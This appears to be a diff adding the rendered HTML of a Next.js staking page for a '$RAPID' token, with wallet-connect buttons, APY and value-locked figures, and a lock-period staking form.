+  <style data-css-hash="_effect-css-fpg3f5-antSlideDownOut" data-rc-order="prependQueue" data-rc-priority="-999">
+   @keyframes css-fpg3f5-antSlideDownOut{0%{transform:scaleY(1);transform-origin:100% 100%;opacity:1;}100%{transform:scaleY(0.8);transform-origin:100% 100%;opacity:0;}}
+  </style>
+  <style data-css-hash="_effect-css-fpg3f5-antMoveUpIn" data-rc-order="prependQueue" data-rc-priority="-999">
+   @keyframes css-fpg3f5-antMoveUpIn{0%{transform:translate3d(0, -100%, 0);transform-origin:0 0;opacity:0;}100%{transform:translate3d(0, 0, 0);transform-origin:0 0;opacity:1;}}
+  </style>
+  <style data-css-hash="_effect-css-fpg3f5-antMoveUpOut" data-rc-order="prependQueue" data-rc-priority="-999">
+   @keyframes css-fpg3f5-antMoveUpOut{0%{transform:translate3d(0, 0, 0);transform-origin:0 0;opacity:1;}100%{transform:translate3d(0, -100%, 0);transform-origin:0 0;opacity:0;}}
+  </style>
+  <style data-css-hash="_effect-css-fpg3f5-antMoveDownIn" data-rc-order="prependQueue" data-rc-priority="-999">
+   @keyframes css-fpg3f5-antMoveDownIn{0%{transform:translate3d(0, 100%, 0);transform-origin:0 0;opacity:0;}100%{transform:translate3d(0, 0, 0);transform-origin:0 0;opacity:1;}}
+  </style>
+  <style data-css-hash="_effect-css-fpg3f5-antMoveDownOut" data-rc-order="prependQueue" data-rc-priority="-999">
+   @keyframes css-fpg3f5-antMoveDownOut{0%{transform:translate3d(0, 0, 0);transform-origin:0 0;opacity:1;}100%{transform:translate3d(0, 100%, 0);transform-origin:0 0;opacity:0;}}
+  </style>
+  <style data-css-hash="_effect-css-fpg3f5-antZoomBigIn" data-rc-order="prependQueue" data-rc-priority="-999">
+   @keyframes css-fpg3f5-antZoomBigIn{0%{transform:scale(0.8);opacity:0;}100%{transform:scale(1);opacity:1;}}
+  </style>
+  <style data-css-hash="_effect-css-fpg3f5-antZoomBigOut" data-rc-order="prependQueue" data-rc-priority="-999">
+   @keyframes css-fpg3f5-antZoomBigOut{0%{transform:scale(1);}100%{transform:scale(0.8);opacity:0;}}
+  </style>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width" name="viewport"/>
+  <title>
+   $RAPID Stake App
+  </title>
+  <meta content="Generated by create next app" name="description"/>
+  <meta content="4" name="next-head-count"/>
+  <link as="style" href="/_next/static/css/eef6acecb528c1ef.css" rel="preload"/>
+  <link data-n-g="" href="/_next/static/css/eef6acecb528c1ef.css" rel="stylesheet"/>
+ </head>
+ <link href="totalcss.css" rel="stylesheet"/>
+ <body>
+  <div id="__next">
+   <div data-rk="">
+    <style>
+     [data-rk]{--rk-blurs-modalOverlay:blur(0px);--rk-fonts-body:SFRounded, ui-rounded, "SF Pro Rounded", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";--rk-radii-actionButton:9999px;--rk-radii-connectButton:12px;--rk-radii-menuButton:12px;--rk-radii-modal:24px;--rk-radii-modalMobile:28px;--rk-colors-accentColor:#0E76FD;--rk-colors-accentColorForeground:#FFF;--rk-colors-actionButtonBorder:rgba(0, 0, 0, 0.04);--rk-colors-actionButtonBorderMobile:rgba(0, 0, 0, 0.06);--rk-colors-actionButtonSecondaryBackground:rgba(0, 0, 0, 0.06);--rk-colors-closeButton:rgba(60, 66, 66, 0.8);--rk-colors-closeButtonBackground:rgba(0, 0, 0, 0.06);--rk-colors-connectButtonBackground:#FFF;--rk-colors-connectButtonBackgroundError:#FF494A;--rk-colors-connectButtonInnerBackground:linear-gradient(0deg, rgba(0, 0, 0, 0.03), rgba(0, 0, 0, 0.06));--rk-colors-connectButtonText:#25292E;--rk-colors-connectButtonTextError:#FFF;--rk-colors-connectionIndicator:#30E000;--rk-colors-downloadBottomCardBackground:linear-gradient(126deg, rgba(255, 255, 255, 0) 9.49%, rgba(171, 171, 171, 0.04) 71.04%), #FFFFFF;--rk-colors-downloadTopCardBackground:linear-gradient(126deg, rgba(171, 171, 171, 0.2) 9.49%, rgba(255, 255, 255, 0) 71.04%), #FFFFFF;--rk-colors-error:#FF494A;--rk-colors-generalBorder:rgba(0, 0, 0, 0.06);--rk-colors-generalBorderDim:rgba(0, 0, 0, 0.03);--rk-colors-menuItemBackground:rgba(60, 66, 66, 0.1);--rk-colors-modalBackdrop:rgba(0, 0, 0, 0.3);--rk-colors-modalBackground:#FFF;--rk-colors-modalBorder:transparent;--rk-colors-modalText:#25292E;--rk-colors-modalTextDim:rgba(60, 66, 66, 0.3);--rk-colors-modalTextSecondary:rgba(60, 66, 66, 0.6);--rk-colors-profileAction:#FFF;--rk-colors-profileActionHover:rgba(255, 255, 255, 0.5);--rk-colors-profileForeground:rgba(60, 66, 66, 0.06);--rk-colors-selectedOptionBorder:rgba(60, 66, 66, 0.1);--rk-colors-standby:#FFD641;--rk-shadows-connectButton:0px 4px 12px rgba(0, 0, 0, 0.1);--rk-shadows-dialog:0px 8px 32px rgba(0, 0, 0, 0.32);--rk-shadows-profileDetailsAction:0px 2px 6px rgba(37, 41, 46, 0.04);--rk-shadows-selectedOption:0px 2px 6px rgba(0, 0, 0, 0.24);--rk-shadows-selectedWallet:0px 2px 6px rgba(0, 0, 0, 0.12);--rk-shadows-walletLogo:0px 2px 16px rgba(0, 0, 0, 0.16);}
+    </style>
+    <div>
+     <div class="flex flex-col gap-4 w-full h-full container max-w-[1200px] p-4 mx-auto">
+      <div class="h-[80px] rounded-lg bg-theme-mainColor w-full flex px-4 py-2 items-center justify-between">
+       <div class="h-[80px] flex items-center justify-start max-h-full">
+        <img alt="" class="max-h-full my-auto object-contain w-[72px]" data-nimg="1" decoding="async" height="241" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo.a381747a.png&amp;w=640&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo.a381747a.png&amp;w=256&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Flogo.a381747a.png&amp;w=640&amp;q=75 2x" style="color: transparent;" width="239"/>
+       </div>
+       <svg class="ant-dropdown-trigger text-5xl text-white flex md:hidden" fill="currentColor" height="1em" stroke="currentColor" stroke-width="0" viewbox="0 0 24 24" width="1em" xmlns="http://www.w3.org/2000/svg">
+        <path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z">
+        </path>
+       </svg>
+       <div class="hidden md:flex items-center justify-end w-3/6 gap-2">
+        <a class="connectButton" href="https://www.rapidchain.net/" target="_blank">
+         <button class="p-2 px-6 text-md text-white font-bold flex items-center gap-1 border-[1px] bg-none border-slate-400 connectButton">
+          BUY $RAPID
+         </button>
+        </a>
+        <div style="">
+         <button class="p-2 px-6 bg-white text-md font-bold text-black flex items-center gap-1 connectButton" type="button">
+          Connect Wallet
+         </button>
+        </div>
+       </div>
+      </div>
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+       <div class="bg-theme-mainbold rounded-lg p-6 flex flex-col gap-6">
+        <span class="text-xl md:text-3xl font-bold text-white">
+         22,502
+        </span>
+        <div class="flex flex-col">
+         <span class="text-md md:text-lg text-slate-300">
+          Total Value Locked
+         </span>
+         <img alt="" class="w-full" data-nimg="1" decoding="async" height="44" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fstatistics.48815d53.png&amp;w=640&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fstatistics.48815d53.png&amp;w=384&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fstatistics.48815d53.png&amp;w=640&amp;q=75 2x" style="color: transparent;" width="266"/>
+        </div>
+       </div>
+       <div class="bg-theme-mainbold rounded-lg p-6 flex flex-col gap-6">
+        <span class="text-xl md:text-3xl font-bold text-white">
+         10%
+        </span>
+        <div class="flex flex-col">
+         <span class="text-md md:text-lg text-slate-300">
+          Avarage Apy
+         </span>
+         <img alt="" class="w-full" data-nimg="1" decoding="async" height="44" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fstatistics.48815d53.png&amp;w=640&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fstatistics.48815d53.png&amp;w=384&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fstatistics.48815d53.png&amp;w=640&amp;q=75 2x" style="color: transparent;" width="266"/>
+        </div>
+       </div>
+       <div class="bg-theme-mainbold rounded-lg p-6 flex flex-col gap-6">
+        <span class="text-xl md:text-3xl font-bold text-white">
+         6
+        </span>
+        <div class="flex flex-col">
+         <span class="text-md md:text-lg text-slate-300">
+          Number of Stakers
+         </span>
+         <img alt="" class="w-full" data-nimg="1" decoding="async" height="44" loading="lazy" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fstatistics.48815d53.png&amp;w=640&amp;q=75" srcset="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fstatistics.48815d53.png&amp;w=384&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fstatistics.48815d53.png&amp;w=640&amp;q=75 2x" style="color: transparent;" width="266"/>
+        </div>
+       </div>
+      </div>
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
+       <div class="w-full h-full flex flex-col p-6 gap-4 rounded-lg bg-theme-mainbold">
+        <div class="flex items-center justify-between">
+         <div class="flex flex-col gap-2 w-full">
+          <h2 class="text-2xl text-white">
+           Stake
+          </h2>
+          <h4 class="text-xl text-white">
+           Time remaining for the stake to close :
+          </h4>
+          <div class="grid grid-cols-2 md:grid-cols-4 w-full">
+           <span class="w-full py-2 text-sm text-center text-slate-300">
+            -12 DAYS
+           </span>
+           <span class="w-full py-2 text-sm text-center text-slate-300">
+            -1 HOURS
+           </span>
+           <span class="w-full py-2 text-sm text-center text-slate-300">
+            -11 MINUTES
+           </span>
+           <span class="w-full py-2 text-sm text-center text-slate-300">
+            -25 SECONDS
+           </span>
+          </div>
+          <hr class="border-[1px] border-slate-600 w-full h-[1px]"/>
+         </div>
+        </div>
+        <div class="grid grid-cols-3 w-full gap-2">
+         <button class="mx-auto font-bold px-4 w-full py-2 hover:bg-theme-gray hover:text-theme-blueBold text-md text-white border-[1px] border-theme-gray connectButton">
+          3 MONTHS
+         </button>
+         <button class="mx-auto font-bold px-4 w-full py-2 hover:bg-theme-gray hover:text-theme-blueBold text-md text-white border-[1px] border-theme-gray connectButton">
+          6 MONTHS
+         </button>
+         <button class="mx-auto font-bold px-4 w-full py-2 hover:bg-theme-gray hover:text-theme-blueBold text-md text-white border-[1px] border-theme-gray bg-theme-gray text-theme-blueBold connectButton">
+          12 MONTHS
+         </button>
+        </div>
+        <div class="flex flex-col gap-2">
+         <div class="flex items-center justify-start gap-1">
+          <span class="text-slate-400 text-lg">
+           Lock period:
+          </span>
+          <span class="text-white text-lg">
+           12 Months
+          </span>
+         </div>
+         <div class="flex items-center justify-start gap-1">
+          <span class="text-slate-400 text-lg">
+           APY Rate:
+          </span>
+          <span class="text-theme-blueBold text-lg">
+           12%
+          </span>
+         </div>
+         <div class="flex items-center justify-start gap-1">
+          <span class="text-slate-400 text-lg">
+           Unlock Time:
+          </span>
+          <span class="text-white text-lg">
+           04.02.2025
+          </span>
+         </div>
+        </div>
+        <span class="text-white text-lg font-bold">
+         Balance: 0 RAPID
+        </span>
+        <div class="flex justify-around w-full items-center gap-2 md:gap-6">
+         <div class="flex items-center justify-between border-[1px] p-4 w-4/6 border-theme-gray">
+          <input class="max-w-[75%] bg-theme-mainbold outline-0 text-slate-300 px-3" min="0" placeholder="00.00" type="number" value="0"/>
+          <span class="text-white">
+           MAX
+          </span>
+         </div>
+         <button class="mx-auto font-bold p-4 bg-theme-blueBold text-white w-full text-md border-[1px] border-theme-gray connectButton">
+          Approve
+         </button>
+        </div>
+       </div>
+       <div class="w-full flex flex-col p-6 gap-4 rounded-lg bg-theme-mainbold">
+        <div class="flex items-center justify-between">
+         <div class="flex flex-col gap-2 w-full">
+          <h2 class="text-2xl text-white">
+           My Stakes
+          </h2>
+          <hr class="border-[1px] border-slate-600 w-full h-[1px]"/>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <next-route-announcer>
+   <p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;">
+   </p>
+  </next-route-announcer>
+  <iframe id="verify-api" src="https://verify.walletconnect.com/1ed84070cf42fe3fc70b4c1c9244ce8b" style="display: none;">
+  </iframe>
+  <wcm-modal>
+  </wcm-modal>
+ </body>
+</html>
